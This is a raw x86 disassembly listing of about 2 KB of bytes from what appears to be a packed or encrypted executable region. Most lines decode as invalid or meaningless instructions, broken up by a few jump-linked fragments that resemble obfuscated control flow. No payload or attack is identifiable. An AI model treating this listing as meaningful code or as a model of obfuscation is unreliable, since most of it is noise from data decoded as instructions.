  40ce96:	mov    al,BYTE PTR es:[ebp+0x7c90c6c]
  40ce9d:	int3   
  40ce9e:	in     al,0xef
  40cea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cea1:	shl    BYTE PTR ds:0x40d4cac5,0x98
  40cea8:	clc    
  40cea9:	sub    ah,al
  40ceab:	pop    esp
  40ceac:	pop    ss
  40cead:	xchg   esp,eax
  40ceae:	mov    BYTE PTR [ebp-0x7a],bh
  40ceb1:	pop    ebp
  40ceb2:	retf   0xb36f
  40ceb5:	int3   
  40ceb6:	mov    ch,BYTE PTR [eax]
  40ceb8:	push   eax
  40ceb9:	fidiv  DWORD PTR [edx+0x645fe715]
  40cebf:	mov    dl,0xb
  40cec1:	ret    
  40cec2:	mov    bh,0xf0
  40cec4:	mov    ch,0xf1
  40cec6:	mov    ah,0x7a
  40cec8:	xchg   esi,eax
  40cec9:	pop    ss
  40ceca:	sar    si,0x1e
  40cece:	(bad)  
  40cecf:	and    al,0x76
  40ced1:	cli    
  40ced2:	mov    dl,BYTE PTR [edi+ecx*1-0x8]
  40ced6:	push   ss
  40ced7:	cdq    
  40ced8:	cld    
  40ced9:	ds jnp 0x40cf2a
  40cedc:	aam    0xbe
  40cede:	and    DWORD PTR [eax-0x52f6ea9e],esi
  40cee4:	out    dx,al
  40cee5:	mov    ebp,0x5ac14096
  40ceea:	pop    ss
  40ceeb:	shl    BYTE PTR [ebp-0x1d],1
  40ceee:	daa    
  40ceef:	icebp  
  40cef0:	push   ds
  40cef1:	push   0x4d
  40cef3:	(bad)  
  40cef4:	mov    ds:0xeb0b7a8,eax
  40cef9:	repz rol BYTE PTR [ebx+0x433288d4],0xc1
  40cf01:	xchg   DWORD PTR [ebx+0x3d],ebp
  40cf04:	data16 out 0x2a,al
  40cf07:	in     al,dx
  40cf08:	aaa    
  40cf09:	push   edi
  40cf0a:	push   eax
  40cf0b:	push   cs
  40cf0c:	test   DWORD PTR [ecx+0x53b30d7b],0xf99f905
  40cf16:	into   
  40cf17:	dec    esi
  40cf18:	mov    ecx,0x247f6087
  40cf1d:	inc    ecx
  40cf1e:	xor    BYTE PTR ds:0x7857f,dh
  40cf24:	ins    DWORD PTR es:[edi],dx
  40cf25:	push   ebx
  40cf26:	fidivr DWORD PTR [ebp-0x29]
  40cf29:	lods   eax,DWORD PTR ds:[esi]
  40cf2a:	jb     0x40cece
  40cf2c:	lea    eax,[eax+eiz*1+0x11]
  40cf30:	(bad)
  40cf34:	mov    ebp,DWORD PTR [ebp*8-0x26dc269a]
  40cf3b:	and    al,0xe3
  40cf3d:	push   ecx
  40cf3e:	ss inc ebp
  40cf40:	push   edi
  40cf41:	repz cmp BYTE PTR [eax+0x4fecb09f],0x42
  40cf49:	sub    al,0x35
  40cf4b:	in     al,dx
  40cf4c:	std    
  40cf4d:	dec    edx
  40cf4e:	mov    esp,0xc1d841dd
  40cf53:	pop    esi
  40cf54:	mov    edx,0xe623fe0e
  40cf59:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40cf5b:	jge    0x40cee0
  40cf5d:	mov    al,ds:0x6d4cce7c
  40cf62:	xor    BYTE PTR [ecx-0x4c0e1d84],ch
  40cf68:	fstp   DWORD PTR [eax]
  40cf6a:	add    al,0xd3
  40cf6c:	pusha  
  40cf6d:	pop    ebp
  40cf6e:	xchg   BYTE PTR [edx-0x1366a67d],dl
  40cf74:	adc    esi,ecx
  40cf76:	inc    ecx
  40cf77:	cmp    cl,BYTE PTR [ecx-0x1]
  40cf7a:	lock and BYTE PTR [esi+0x23],0x1d
  40cf7f:	dec    esi
  40cf80:	xor    ah,cl
  40cf82:	mov    al,0x80
  40cf84:	and    eax,0x368247ca
  40cf89:	idiv   BYTE PTR [ecx+0x1e90e735]
  40cf8f:	imul   esi,DWORD PTR [ebx-0x2f597367],0x38c85831
  40cf99:	cwde   
  40cf9a:	out    dx,eax
  40cf9b:	xchg   dx,ax
  40cf9d:	sbb    al,0x11
  40cf9f:	iret   
  40cfa0:	mov    ebx,0xd6eb07d0
  40cfa5:	imul   ebx,DWORD PTR [ebx-0x40],0x7a
  40cfa9:	sub    BYTE PTR [ecx],0xfb
  40cfac:	sbb    ecx,DWORD PTR [edx-0x5fb4f470]
  40cfb2:	aas    
  40cfb3:	stc    
  40cfb4:	ror    BYTE PTR [esi-0x72b09aef],cl
  40cfba:	dec    ecx
  40cfbb:	mov    edx,0xd58679fe
  40cfc0:	mov    cl,0xd8
  40cfc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfc3:	je     0x40cff9
  40cfc5:	dec    BYTE PTR [eax-0x67]
  40cfc8:	int3   
  40cfc9:	mov    ch,0x8e
  40cfcb:	ds cs inc esi
  40cfce:	or     ecx,DWORD PTR [edx+0x4f]
  40cfd1:	sub    DWORD PTR [esi],edx
  40cfd3:	adc    eax,0x91c62479
  40cfd8:	sbb    eax,0x56e7de36
  40cfdd:	enter  0xdacf,0xad
  40cfe1:	into   
  40cfe2:	add    eax,0x3bbd7554
  40cfe7:	sbb    ebx,DWORD PTR [ebx+0x6]
  40cfea:	pop    ebx
  40cfeb:	hlt    
  40cfec:	fdiv   QWORD PTR [ebp+0x32814461]
  40cff2:	jp     0x40cfb8
  40cff4:	sbb    BYTE PTR [ecx+0x72],dl
  40cff7:	mov    ds:0x80d89b1d,al
  40cffc:	pop    ds
  40cffd:	mov    cl,0xd0
  40cfff:	mov    bh,0x16
  40d001:	jns    0x40cfab
  40d003:	adc    eax,0x1466f570
  40d008:	mov    al,ds:0x7a3775c
  40d00d:	sbb    DWORD PTR [ebx-0x79],ebx
  40d010:	or     ah,bh
  40d012:	dec    esi
  40d013:	xor    DWORD PTR [ebx+0x279b5db0],ebp
  40d019:	sar    BYTE PTR [esi+0x24],cl
  40d01c:	cld    
  40d01d:	jp     0x40d00d
  40d01f:	mov    edx,0x63adb15d
  40d024:	pop    ebx
  40d025:	das    
  40d026:	stos   BYTE PTR es:[edi],al
  40d027:	mov    ecx,0x134a0ef6
  40d02c:	repnz data16 mov dl,BYTE PTR [ebx+eax*4-0x1a65a1d0]
  40d035:	cld    
  40d036:	adc    ebp,DWORD PTR [edi]
  40d038:	pop    ebp
  40d039:	fsub   QWORD PTR [ebp+ebp*4-0x46625b4c]
  40d040:	call   0x8992:0x2ae292ae
  40d047:	rol    DWORD PTR [esi-0x77782b0],cl
  40d04d:	push   es
  40d04e:	stos   WORD PTR es:[edi],ax
  40d050:	pop    ebx
  40d051:	and    ebp,ebp
  40d053:	pop    esi
  40d054:	sti    
  40d055:	ret    
  40d056:	jecxz  0x40d037
  40d058:	dec    esp
  40d059:	addr16 mov al,ds:0x681d
  40d05d:	sub    esp,DWORD PTR [edi-0x7e1c985d]
  40d063:	ss push ecx
  40d065:	in     eax,dx
  40d066:	jno    0x40d088
  40d068:	adc    eax,0xc14e7d18
  40d06d:	scas   al,BYTE PTR es:[edi]
  40d06e:	mov    ch,0x35
  40d070:	add    BYTE PTR [ecx+0x65],ch
  40d073:	xchg   ecx,eax
  40d074:	jbe    0x40d07a
  40d076:	(bad)  
  40d077:	fwait
  40d078:	aaa    
  40d079:	add    DWORD PTR [edi-0x6e],ebx
  40d07c:	les    ebx,FWORD PTR [edx+0x574bd434]
  40d082:	cld    
  40d083:	xor    DWORD PTR [esi-0x46],eax
  40d086:	xor    al,0x2c
  40d088:	sbb    eax,0xd01807b5
  40d08d:	mov    ah,0x1d
  40d08f:	jp     0x40d062
  40d091:	fwait
  40d092:	xor    al,dl
  40d094:	ins    DWORD PTR es:[di],dx
  40d096:	fadd   QWORD PTR [edi+esi*4]
  40d099:	test   DWORD PTR [ebp+0x4f],esp
  40d09c:	leave  
  40d09d:	push   cs
  40d09e:	cli    
  40d09f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0a0:	pop    ds
  40d0a1:	push   ds
  40d0a2:	inc    esp
  40d0a3:	and    bh,BYTE PTR [edi-0x1f]
  40d0a6:	push   es
  40d0a7:	outs   dx,DWORD PTR ds:[esi]
  40d0a8:	lea    ebp,[esp+edx*4+0x21c514d4]
  40d0af:	mov    esi,0x281480f4
  40d0b4:	in     eax,0xcb
  40d0b6:	lea    bp,[edi-0x6b]
  40d0ba:	mov    eax,0x8abcf12e
  40d0bf:	and    ch,BYTE PTR ds:0x860f8786
  40d0c5:	data16 lock (bad) 
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
  40d0d5:	xlat   BYTE PTR ds:[ebx]
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	(bad)  
  40d0ee:	cld    
  40d0ef:	sbb    al,0x75
  40d0f1:	mov    esi,0x70709daa
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d11c
  40d0fb:	jno    0x40d15b
  40d0fd:	repnz pop edi
  40d0ff:	outs   dx,BYTE PTR ds:[esi]
  40d100:	or     al,0xa8
  40d102:	sbb    BYTE PTR [ecx-0x10],dh
  40d105:	adc    ah,bl
  40d107:	jl     0x40d0be
  40d109:	mov    esp,0x2c70000a
  40d10e:	or     BYTE PTR [esi+0x50],ah
  40d111:	cmp    eax,DWORD PTR [esi-0x24]
  40d114:	mov    ah,0x7e
  40d116:	(bad)  
  40d117:	mov    ds:0xb098693,eax
  40d11c:	(bad)  
  40d11d:	sti    
  40d11e:	shl    BYTE PTR [esi+0x6337e28],0x6d
  40d125:	fidivr DWORD PTR [edx+0xe0f9399]
  40d12b:	push   eax
  40d12c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d12d:	push   esi
  40d12e:	leave  
  40d12f:	rcr    DWORD PTR [ecx+0x7ad4c629],cl
  40d135:	pop    ecx
  40d136:	es xor eax,0xc743e3e7
  40d13c:	call   0x6e3be51b
  40d141:	test   DWORD PTR [ecx-0x22677c40],esp
  40d147:	clc    
  40d148:	sub    esp,ebp
  40d14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d14b:	aad    0x82
  40d14d:	outs   dx,DWORD PTR ds:[esi]
  40d14e:	mov    bl,0x2
  40d150:	push   ecx
  40d151:	shr    cl,0x85
  40d154:	sbb    edi,DWORD PTR [ecx]
  40d156:	jg     0x40d107
  40d158:	out    dx,eax
  40d159:	jmp    FWORD PTR [ecx]
  40d15b:	inc    eax
  40d15c:	(bad)  
  40d15d:	or     al,0x43
  40d15f:	xor    al,0x70
  40d161:	push   esp
  40d162:	or     ebp,edx
  40d164:	out    0xa,eax
  40d166:	xlat   BYTE PTR ds:[ebx]
  40d167:	jg     0x40d0f6
  40d169:	mov    eax,ds:0xcc8ddabf
  40d16e:	add    BYTE PTR [ecx],ah
  40d170:	stos   DWORD PTR es:[edi],eax
  40d171:	aaa    
  40d172:	sub    eax,0x40df0264
  40d177:	xor    ch,BYTE PTR [edx+0x236b05d9]
  40d17d:	sub    al,0xed
  40d17f:	push   edi
  40d180:	push   esi
  40d181:	test   BYTE PTR [edx],ch
  40d183:	cs xchg edi,eax
  40d185:	dec    ebx
  40d186:	int    0xa1
  40d188:	ficom  DWORD PTR [esi]
  40d18a:	lahf   
  40d18b:	jl     0x40d1ab
  40d18d:	shr    BYTE PTR [edi-0x7d25f566],1
  40d193:	dec    eax
  40d194:	dec    ecx
  40d195:	and    al,0x1f
  40d197:	les    ecx,FWORD PTR [ecx+0x73ca752a]
  40d19d:	lods   eax,DWORD PTR ds:[esi]
  40d19e:	ins    BYTE PTR es:[edi],dx
  40d19f:	cli    
  40d1a0:	ja     0x40d1f0
  40d1a2:	cs jl  0x40d145
  40d1a5:	pushf  
  40d1a6:	sbb    ebp,esi
  40d1a8:	mov    ch,0xf9
  40d1aa:	sti    
  40d1ab:	jo     0x40d21f
  40d1ad:	adc    esi,DWORD PTR [edi-0x69aa4624]
  40d1b3:	scas   al,BYTE PTR es:[edi]
  40d1b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1b5:	cmp    bh,BYTE PTR [ebx]
  40d1b7:	(bad)  
  40d1b8:	(bad)  
  40d1b9:	hlt    
  40d1ba:	mov    al,0xf6
  40d1bc:	stos   DWORD PTR es:[edi],eax
  40d1bd:	or     ah,ah
  40d1bf:	mov    bl,0xb0
  40d1c1:	sub    al,0x9a
  40d1c3:	mov    ds:0x93e6d621,al
  40d1c8:	xchg   ecx,eax
  40d1c9:	arpl   WORD PTR [eax+0x75667c37],ax
  40d1cf:	aam    0xef
  40d1d1:	mov    dh,0xd2
  40d1d3:	popa   
  40d1d4:	pop    ebx
  40d1d5:	icebp  
  40d1d6:	push   ecx
  40d1d7:	and    DWORD PTR [ecx+0x6],edx
  40d1da:	or     eax,0xf04180b6
  40d1df:	xchg   esi,eax
  40d1e0:	push   es
  40d1e1:	ins    DWORD PTR es:[edi],dx
  40d1e2:	xor    dl,BYTE PTR [esi]
  40d1e4:	neg    DWORD PTR [edi-0x54c1d52e]
  40d1ea:	retf   0x4f98
  40d1ed:	sbb    edi,ecx
  40d1ef:	mov    ebx,0xf935ec7
  40d1f4:	or     dl,BYTE PTR [ecx+edi*1+0x7e]
  40d1f8:	dec    esp
  40d1f9:	jbe    0x40d279
  40d1fb:	icebp  
  40d1fc:	loopne 0x40d23d
  40d1fe:	pop    ds
  40d1ff:	aad    0x1f
  40d201:	xor    DWORD PTR [edi-0x49],esp
  40d204:	sbb    BYTE PTR [eax+0x22],ch
  40d207:	in     eax,dx
  40d208:	jle    0x40d192
  40d20a:	fwait
  40d20b:	rcl    DWORD PTR [ebp-0x22],cl
  40d20e:	(bad)  
  40d20f:	push   ds
  40d210:	mov    bh,0x58
  40d212:	scas   al,BYTE PTR es:[edi]
  40d213:	push   cs
  40d214:	and    eax,0xe3811617
  40d219:	sar    BYTE PTR [ecx+0x28f2e954],1
  40d21f:	enter  0x9ece,0xa2
  40d223:	xor    eax,0x8560cca6
  40d228:	fist   WORD PTR [edx+0x31]
  40d22b:	xchg   edx,eax
  40d22c:	stc    
  40d22d:	and    DWORD PTR [eax+0x415c2230],esi
  40d233:	cmp    eax,0x9a8135ab
  40d238:	adc    ecx,DWORD PTR [bx-0x727f]
  40d23d:	test   DWORD PTR [ebx+eax*2-0x36],esp
  40d241:	call   0x6830563f
  40d246:	fcom   QWORD PTR [edi-0x1bc8da6f]
  40d24c:	sub    eax,0x1f1a7439
  40d251:	fnstsw WORD PTR [ecx]
  40d253:	jno    0x40d220
  40d255:	popf   
  40d256:	lock sbb ecx,DWORD PTR [eax+eiz*2]
  40d25a:	int    0x29
  40d25c:	cld    
  40d25d:	add    DWORD PTR [esi],edx
  40d25f:	mov    esp,0x9129ad1a
  40d264:	hlt    
  40d265:	sbb    ecx,DWORD PTR [esi+0x3d137540]
  40d26b:	std    
  40d26c:	stos   BYTE PTR es:[edi],al
  40d26d:	mov    bh,0x4b
  40d26f:	dec    esp
  40d270:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d271:	mov    ecx,DWORD PTR [esi-0x51]
  40d274:	mov    edi,0xc1c769d1
  40d279:	adc    ebx,DWORD PTR ss:[edx-0x62bb8601]
  40d280:	push   DWORD PTR [ecx]
  40d282:	loope  0x40d2bb
  40d284:	mov    al,ds:0x901a669f
  40d289:	mov    BYTE PTR [ecx],dh
  40d28b:	mov    al,0x12
  40d28d:	or     dh,0xc4
  40d290:	lahf   
  40d291:	test   DWORD PTR [ebx+0x66cfdaa7],esi
  40d297:	cmp    ebx,DWORD PTR [ecx-0x44feedfe]
  40d29d:	mov    ebx,0xd91f912
  40d2a2:	add    edx,DWORD PTR [edx]
  40d2a4:	push   0xfffffff8
  40d2a6:	xor    BYTE PTR [edi],dh
  40d2a8:	int3   
  40d2a9:	jns    0x40d280
  40d2ab:	out    dx,eax
  40d2ac:	gs dec edi
  40d2ae:	mov    al,0xdf
  40d2b0:	mov    ebx,0x904da97c
  40d2b5:	dec    ebp
  40d2b6:	dec    ebx
  40d2b7:	aaa    
  40d2b8:	(bad)  
  40d2b9:	fistp  DWORD PTR [edx]
  40d2bb:	jb     0x40d330
  40d2bd:	push   ds
  40d2be:	cs xor ecx,edi
  40d2c1:	aam    0xab
  40d2c3:	test   al,0x6e
  40d2c5:	test   DWORD PTR [ebx-0x159da3cc],ecx
  40d2cb:	or     bh,BYTE PTR [esi+0x7897c57]
  40d2d1:	test   eax,0x8024e303
  40d2d6:	add    bl,BYTE PTR [esi+0x2d152235]
  40d2dc:	call   0xc67a4419
  40d2e1:	fwait
  40d2e2:	std    
  40d2e3:	cmp    edi,0xffffffdd
  40d2e6:	stc    
  40d2e7:	test   al,0x90
  40d2e9:	push   0xffffff83
  40d2eb:	(bad)  
  40d2ed:	loopne 0x40d362
  40d2ef:	test   DWORD PTR [ecx-0x372d8b7d],edi
  40d2f5:	push   eax
  40d2f6:	add    eax,0x2c2324ba
  40d2fb:	pop    esp
  40d2fc:	retf   0xdd64
  40d2ff:	sbb    al,0xe8
  40d301:	fxch   st(1)
  40d303:	xlat   BYTE PTR ds:[ebx]
  40d304:	mov    al,0x8f
  40d306:	imul   ebp,DWORD PTR [ebp-0x75],0x2
  40d30a:	jp     0x40d2e6
  40d30c:	xchg   esp,eax
  40d30d:	js     0x40d2b0
  40d30f:	jne    0x40d311
  40d311:	fs or  bl,0x34
  40d315:	daa    
  40d316:	cmp    eax,0xeddd3803
  40d31b:	cmp    esi,DWORD PTR [edi+0x57]
  40d31e:	push   ecx
  40d31f:	push   ebx
  40d320:	jno    0x40d38a
  40d322:	sbb    bl,BYTE PTR [eax-0x31]
  40d325:	sti    
  40d326:	jge    0x40d33e
  40d328:	stos   BYTE PTR es:[edi],al
  40d329:	ret    
  40d32a:	pusha  
  40d32b:	xor    ch,dl
  40d32d:	mov    al,0x3a
  40d32f:	popa   
  40d330:	xchg   ecx,eax
  40d331:	in     eax,0x61
  40d333:	sbb    DWORD PTR [esi],ecx
  40d335:	int3   
  40d336:	imul   edx,DWORD PTR [esi],0x7e8497af
  40d33c:	cmp    ecx,DWORD PTR [edx+ebx*1]
  40d33f:	ss add eax,0x2ff94f6c
  40d345:	scas   eax,DWORD PTR es:[edi]
  40d346:	dec    esi
  40d347:	mov    cl,0x36
  40d349:	inc    ecx
  40d34a:	jmp    0x40d362
  40d34c:	add    ah,BYTE PTR [eax+eiz*8-0x54]
  40d350:	sub    edi,esp
  40d352:	mov    ebx,0xe57fc23c
  40d357:	push   es
  40d358:	shl    DWORD PTR [edx+0x41c22908],1
  40d35e:	and    eax,0x6066b0af
  40d363:	add    eax,0xc5256065
  40d368:	xchg   DWORD PTR [eax+0x24],eax
  40d36b:	mov    ah,0xf1
  40d36d:	in     eax,0xf9
  40d36f:	or     ch,0x6c
  40d372:	push   cs
  40d373:	in     eax,0x57
  40d375:	xchg   edx,eax
  40d376:	xor    al,0xef
  40d378:	fldenv [edi]
  40d37a:	and    al,0xca
  40d37c:	xor    dh,bl
  40d37e:	mov    ch,0xaf
  40d380:	sbb    eax,0x684e96ff
  40d385:	repz adc DWORD PTR [ecx-0x64773656],eax
  40d38c:	xchg   ecx,eax
  40d38d:	pop    ebx
  40d38e:	jg     0x40d36c
  40d390:	add    eax,0xf6838d72
  40d395:	dec    BYTE PTR [eax-0x75]
  40d398:	inc    ebx
  40d399:	cmp    ebx,DWORD PTR ds:0x2887b178
  40d39f:	inc    esi
  40d3a0:	jl     0x40d356
  40d3a2:	dec    edx
  40d3a3:	in     eax,dx
  40d3a4:	out    dx,eax
  40d3a5:	xor    ebx,DWORD PTR [ebx-0xdc1608d]
  40d3ab:	lods   eax,DWORD PTR ds:[esi]
  40d3ac:	jle    0x40d40e
  40d3ae:	pop    esp
  40d3af:	dec    esp
  40d3b0:	cmp    ah,BYTE PTR [eax]
  40d3b2:	outs   dx,DWORD PTR ds:[esi]
  40d3b3:	cdq    
  40d3b4:	mov    esp,0x9981003d
  40d3b9:	dec    edx
  40d3ba:	fmul   st(7),st
  40d3bc:	sbb    al,0xf5
  40d3be:	out    0xa,al
  40d3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3c1:	and    eax,0x756d0f9f
  40d3c6:	pop    esp
  40d3c7:	retf   0xeb71
  40d3ca:	cmp    al,0x35
  40d3cc:	fnsave [edi]
  40d3ce:	(bad)  [ebx]
  40d3d1:	dec    ebp
  40d3d2:	aad    0x6b
  40d3d4:	scas   eax,DWORD PTR es:[edi]
  40d3d5:	jbe    0x40d425
  40d3d7:	xchg   ebp,eax
  40d3d8:	inc    edi
  40d3d9:	add    DWORD PTR [edi+ebx*4],ebx
  40d3dc:	xchg   esi,eax
  40d3dd:	cld    
  40d3de:	jmp    0x40d3ff
  40d3e0:	push   0xffffffcd
  40d3e2:	aad    0x85
  40d3e4:	retf   
  40d3e5:	cwde   
  40d3e6:	mov    esp,0x31366983
  40d3eb:	sbb    BYTE PTR [ecx-0x1fd31ac9],al
  40d3f1:	(bad)  
  40d3f2:	xchg   edi,eax
  40d3f3:	pop    esi
  40d3f4:	xchg   edi,eax
  40d3f5:	loop   0x40d3fd
  40d3f7:	push   ebx
  40d3f8:	lahf   
  40d3f9:	es stc 
  40d3fb:	cwde   
  40d3fc:	leave  
  40d3fd:	in     eax,dx
  40d3fe:	cmp    BYTE PTR [eax+ebp*8+0xe],ah
  40d402:	cli    
  40d403:	xchg   edx,eax
  40d404:	hlt    
  40d405:	cwde   
  40d406:	pop    ss
  40d407:	jg     0x5bde646f
  40d40d:	fidivr WORD PTR [eax]
  40d40f:	aam    0x83
  40d411:	xor    eax,DWORD PTR [ecx+0x7c]
  40d414:	jl     0x40d42c
  40d416:	mov    al,0xec
  40d418:	pop    edi
  40d419:	aaa    
  40d41a:	jno    0x40d451
  40d41c:	test   eax,0x114fc846
  40d421:	lods   eax,DWORD PTR ds:[esi]
  40d422:	retf   0xab5e
  40d425:	in     al,0xf4
  40d427:	or     eax,0xd33741
  40d42c:	push   ebp
  40d42d:	add    ecx,DWORD PTR [ebp+esi*1+0x4c]
  40d431:	mov    ah,0xf2
  40d433:	add    BYTE PTR [ecx-0x50],al
  40d436:	mov    dl,BYTE PTR [edi+edx*2+0x13]
  40d43a:	(bad)  
  40d43b:	(bad)  
  40d43c:	dec    ecx
  40d43d:	int3   
  40d43e:	and    al,0x92
  40d440:	jbe    0x40d422
  40d442:	jle    0x40d474
  40d444:	pop    ebp
  40d445:	aaa    
  40d446:	ins    BYTE PTR es:[edi],dx
  40d447:	ins    BYTE PTR es:[edi],dx
  40d448:	sbb    BYTE PTR [edx],cl
  40d44a:	cwde   
  40d44b:	enter  0x4f6c,0x1a
  40d44f:	inc    esp
  40d450:	pop    ds
  40d451:	inc    edi
  40d452:	push   ebx
  40d453:	das    
  40d454:	in     al,dx
  40d455:	pop    esi
  40d456:	js     0x40d485
  40d458:	cmp    BYTE PTR [eax],ch
  40d45a:	pop    DWORD PTR [edi]
  40d45c:	icebp  
  40d45d:	sbb    DWORD PTR [ebx+0x58],edi
  40d460:	cwde   
  40d461:	push   ebx
  40d462:	call   0xc91bd04b
  40d467:	(bad)
  40d46c:	shl    DWORD PTR [esi+ebx*2+0x2b],1
  40d470:	rol    esp,0x2
  40d473:	cmc    
  40d474:	ss add al,0x2b
  40d477:	mov    ebx,0x690f35a3
  40d47c:	or     eax,DWORD PTR [ebx]
  40d47e:	test   DWORD PTR [edx],0xe6c72c8d
  40d484:	jmp    0x3cedb7a4
  40d489:	dec    ecx
  40d48a:	mov    ebp,ebp
  40d48c:	retf   0xb01f
  40d48f:	jae    0x40d447
  40d491:	bound  ecx,QWORD PTR [edx]
  40d493:	imul   edi,DWORD PTR [ecx-0x72],0x66
  40d497:	mov    edx,0x8b8e4250
  40d49c:	jge    0x40d496
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xe2d3:0xb81a1d63
  40d4c6:	pop    eax
  40d4c7:	fwait
  40d4c8:	mov    al,ds:0x707099c9
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d547
  40d4d2:	(bad)  
  40d4d3:	in     eax,dx
  40d4d4:	stc    
  40d4d5:	rol    BYTE PTR [ebx],1
  40d4d7:	clc    
  40d4d8:	movups XMMWORD PTR [ebx+ebx*8+0x3c],xmm7
  40d4dd:	jmp    0x8039:0xdf010f4a
  40d4e4:	(bad)  
  40d4e5:	(bad)  
  40d4e6:	or     DWORD PTR [ecx+0x5e],ebp
  40d4e9:	leave  
  40d4ea:	test   eax,0x932d70da
  40d4ef:	pop    ecx
  40d4f0:	mov    eax,0x2fb8dcc3
  40d4f5:	jl     0x40d495
  40d4f7:	rcr    DWORD PTR [edx+eax*2+0x50],0xfa
  40d4fc:	pop    ebx
  40d4fd:	mov    cs,WORD PTR [edi-0x46121863]
  40d503:	mov    dl,0x8e
  40d505:	scas   al,BYTE PTR es:[edi]
  40d506:	xchg   esp,eax
  40d507:	mov    esp,0x96263fc0
  40d50c:	mov    ebx,DWORD PTR [edi]
  40d50e:	aas    
  40d50f:	add    eax,0xaa590d02
  40d514:	icebp  
  40d515:	push   0x454c8cc9
  40d51a:	hlt    
  40d51b:	loopne 0x40d51e
  40d51d:	cmp    al,0x7c
  40d51f:	fwait
  40d520:	mov    dh,0x4c
  40d522:	mov    esi,0x719b632f
  40d527:	leave  
  40d528:	addr16 cdq 
  40d52a:	outs   dx,DWORD PTR ds:[esi]
  40d52b:	cld    
  40d52c:	mov    al,ds:0xefc662b2
  40d531:	dec    eax
  40d532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d533:	xchg   edi,eax
  40d534:	xchg   BYTE PTR [edx],cl
  40d536:	arpl   WORD PTR [eax+0x8af84be],dx
  40d53c:	adc    DWORD PTR ds:0x3c59438a,eax
  40d542:	push   ecx
  40d543:	test   DWORD PTR [edx-0x3e456da4],ecx
  40d549:	xlat   BYTE PTR ds:[ebx]
  40d54a:	cdq    
  40d54b:	jg     0xf662b129
  40d551:	fcmove st,st(3)
  40d553:	loop   0x40d555
  40d555:	xchg   esp,eax
  40d556:	dec    esp
  40d557:	mov    edx,0xceb0b407
  40d55c:	push   ss
  40d55d:	mov    cl,BYTE PTR [esi]
  40d55f:	pushf  
  40d560:	lods   al,BYTE PTR ds:[esi]
  40d561:	mov    ah,0xb9
  40d563:	dec    ecx
  40d564:	out    0x55,eax
  40d566:	inc    esi
  40d568:	repnz test BYTE PTR [edi+0x34e2d23e],dl
  40d56f:	push   edx
  40d570:	xor    DWORD PTR [edi-0x2d],esp
  40d573:	lds    ebx,FWORD PTR [ecx-0xb]
  40d576:	push   ds
  40d577:	enter  0xee9b,0xf3
  40d57b:	jnp    0x40d574
  40d57d:	add    dl,BYTE PTR [ebx-0x42]
  40d580:	outs   dx,BYTE PTR ds:[esi]
  40d581:	scas   al,BYTE PTR es:[edi]
  40d582:	ja     0x40d542
  40d584:	shl    BYTE PTR es:[ecx],0x34
  40d588:	call   0x3b4ce184
  40d58d:	xor    DWORD PTR [eax],edx
  40d58f:	mov    eax,ds:0x2c827033
  40d594:	pop    esp
  40d595:	mov    edx,0x1e0c150
  40d59a:	dec    esi
  40d59b:	repz int 0x1d
  40d59e:	pop    eax
  40d59f:	sub    cl,BYTE PTR [ebx+0x51]
  40d5a2:	mov    ds:0xa06ccd43,eax
  40d5a7:	stc    
  40d5a8:	jo     0x40d603
  40d5aa:	or     DWORD PTR [ecx-0x4c],eax
  40d5ad:	jg     0x40d5c2
  40d5af:	dec    ecx
  40d5b0:	xor    eax,0x5c3d0e3a
  40d5b5:	addr16 or al,0xf0
  40d5b8:	sbb    eax,0x3e88ba43
  40d5bd:	or     BYTE PTR [eax],bl
  40d5bf:	into   
  40d5c0:	xor    ecx,edx
  40d5c2:	jns    0x40d575
  40d5c4:	mov    ds:0x62872d95,eax
  40d5c9:	or     BYTE PTR [edi+0x26fa42b9],0xdf
  40d5d0:	push   ebp
  40d5d1:	sub    al,0xfb
  40d5d3:	dec    edx
  40d5d4:	mov    ah,0xb7
  40d5d6:	sbb    esi,DWORD PTR [edi]
  40d5d8:	sti    
  40d5d9:	sub    eax,0x6ec3146b
  40d5de:	xor    BYTE PTR [ebx-0x4a08a009],bh
  40d5e4:	arpl   WORD PTR [ebx+0x45],bp
  40d5e7:	sub    esp,edi
  40d5e9:	pop    esi
  40d5ea:	shr    DWORD PTR [ebx+0x7a],0x2d
  40d5ee:	jmp    0x9e9:0x17738ce0
  40d5f5:	int3   
  40d5f6:	mov    ah,0x97
  40d5f8:	pop    ebx
  40d5f9:	xchg   esp,eax
  40d5fa:	push   cs
  40d5fb:	mov    ds:0xe6936170,eax
  40d600:	xchg   edx,eax
  40d601:	(bad)  
  40d603:	retf   0x771e
  40d606:	cmp    bl,BYTE PTR [esi+0x13]
